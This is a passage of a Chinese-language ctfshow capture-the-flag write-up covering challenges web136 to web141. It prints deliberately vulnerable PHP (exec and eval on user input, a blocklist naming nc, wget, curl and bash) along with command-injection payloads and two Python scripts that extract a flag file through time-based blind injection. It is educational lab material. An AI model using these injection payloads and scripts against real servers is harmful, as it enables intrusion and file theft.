punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\>|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'too young too simple sometimes naive!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>tee 命令用于读取标准输入的数据，这里可以将执行的结果输入到新的文件然后读取</p>\n<p>payload</p>\n<pre><code>?c=ls /| tee 1\n</code></pre>\n<p>这里会将 ls / 的查询结果写入 1 中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217104454990.png\" alt=\"image-20230217104454990\" /></p>\n<p>再读取文件就可以了</p>\n<pre><code>?c=cat /f149_15_h3r3| tee 1\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217104616360.png\" alt=\"image-20230217104616360\" /></p>\n<h2 id=\"web137\"><a class=\"anchor\" href=\"#web137\">#</a> web137</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshow</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"private class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>这里直接调用静态方法即可，payload</p>\n<pre><code>ctfshow=ctfshow::getFlag\nctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217152126627.png\" alt=\"image-20230217152126627\" /></p>\n<h2 id=\"web138\"><a class=\"anchor\" href=\"#web138\">#</a> web138</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshow</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"private class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"private function\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>：被 ban，还可以使用上面数组的方式</p>\n<p>call_user_func 函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用</p>\n<pre><code>ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag\n</code></pre>\n<h2 id=\"web139\"><a class=\"anchor\" href=\"#web139\">#</a> web139</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\>|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'too young too simple sometimes naive!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这题好像和 136 一样但是使用 tee 命令却带不出回显了这里使用了一个新的命令 awk</p>\n<p>AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217183611353.png\" alt=\"image-20230217183611353\" /></p>\n<p>cut 命令用于显示每行从开头算起 num1 到 num2 的文字</p>\n<figure class=\"highlight txt\"><figcaption data-lang=\"txt\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>-c ：以字符为单位进行分割。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>-d ：自定义分隔符，默认为制表符。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>-f ：与-d一起使用，指定显示哪个区域。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>范围之内，该字符将被写出；否则，该字符将被排除</pre></td></tr></table></figure><p>这里配合 cut 可以将字符单个输出</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217183827166.png\" alt=\"image-20230217183827166\" /></p>\n<p>通过 shell 语法延迟，将字符转换为时间信道</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218121621350.png\" alt=\"image-20230218121621350\" /></p>\n<p>那么就可以做到类似时间盲注的效果，简单的整个 exp，找到存放 flag 的文件</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin\">str</span><span class=\"token operator\">=</span>string<span class=\"token punctuation\">.</span>digits<span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>ascii_letters<span class=\"token operator\">+</span><span class=\"token string\">\"-_.\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#rint(str)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://f59ad576-2f1c-49a2-b14d-92df62c3edfa.challenge.ctf.show/?c=\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">for</span> s <span class=\"token keyword\">in</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            payload <span class=\"token operator\">=</span> <span class=\"token string\">\"if [ `ls / -1|awk \\\"NR==&#123;0&#125;\\\" |cut -c &#123;1&#125;` == \\\"&#123;2&#125;\\\" ];then sleep 3;fi\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            payloadpro<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span>payload</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token comment\">#print(payloadpro)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>payloadpro<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                flag<span class=\"token operator\">=</span>flag<span class=\"token operator\">+</span>s</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    flag<span class=\"token operator\">=</span>flag<span class=\"token operator\">+</span><span class=\"token string\">\" \"</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218175130501.png\" alt=\"image-20230218175130501\" /></p>\n<p>接下来将命令改一下拿到 flag</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin\">str</span><span class=\"token operator\">=</span>string<span class=\"token punctuation\">.</span>digits<span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>ascii_letters<span class=\"token operator\">+</span><span class=\"token string\">\"-_.\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#rint(str)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://f59ad576-2f1c-49a2-b14d-92df62c3edfa.challenge.ctf.show/?c=\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">for</span> s <span class=\"token keyword\">in</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            payload <span class=\"token operator\">=</span> <span class=\"token string\">\"if [ `cat /f149_15_h3r3|awk \\\"NR==&#123;0&#125;\\\" |cut -c &#123;1&#125;` == \\\"&#123;2&#125;\\\" ];then sleep 3;fi\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            payloadpro<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span>payload</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token comment\">#print(payloadpro)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>payloadpro<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                flag<span class=\"token operator\">=</span>flag<span class=\"token operator\">+</span>s</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    flag<span class=\"token operator\">=</span>flag<span class=\"token operator\">+</span><span class=\"token string\">\" \"</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218175624322.png\" alt=\"image-20230218175624322\" /></p>\n<h2 id=\"web140\"><a class=\"anchor\" href=\"#web140\">#</a> web140</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$f1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$f2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^[a-z0-9]+$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$f1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^[a-z0-9]+$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$f2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"return <span class=\"token interpolation\"><span class=\"token variable\">$f1</span></span>(<span class=\"token interpolation\"><span class=\"token variable\">$f2</span></span>());\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>最后一个 if 是一个弱类型比较，只要上面的值为 0 或者 false 或 NULL 的</p>\n<pre><code>post f1=usleep&amp;f2=usleep\npost f1=gmdate&amp;f2=gmdate\npost f1=intval&amp;f2=intval\npost f1=system&amp;f2=system\n</code></pre>\n<p>等等，很多函数都可以</p>\n<h2 id=\"web141\"><a class=\"anchor\" href=\"#web141\">#</a> web141</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td 